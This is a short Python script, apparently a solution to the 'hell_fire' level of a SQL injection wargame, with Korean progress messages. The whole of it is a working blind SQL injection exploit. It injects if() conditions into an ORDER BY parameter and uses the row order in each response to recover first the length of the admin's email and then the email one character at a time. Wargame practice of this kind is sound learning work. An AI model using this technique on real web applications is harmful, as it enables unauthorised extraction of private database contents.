# -*- coding: utf-8 -*-
import requests

url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?order="
head = {'Cookie' : 'PHPSESSID=값'}

length = 1
email = ''

while (1):
    query = "if(id='admin' and length(email)='{}',1,3)%23".format(length)
    req = requests.get(url+query, headers=head)
    print("[ +",length,"]")
    if "<td>200</td></tr><tr><td>rubiya" in req.text:
        print("총 길이는",length)
        break
    else:
        length += 1

for i in range(1, length+1):
    for j in range(48, 122):
        query = "if(id='admin' and substr(email,{},1)=char({}),1,3)%23".format(str(i), j)
        req = requests.get(url+query, headers=head)
        if "<td>200</td></tr><tr><td>rubiya" in req.text:
            email += chr(j)
            print(i,"번째 문자 찾는 중 .. : ",email)
            break
        
            
print("EMAIL : ",email.lower())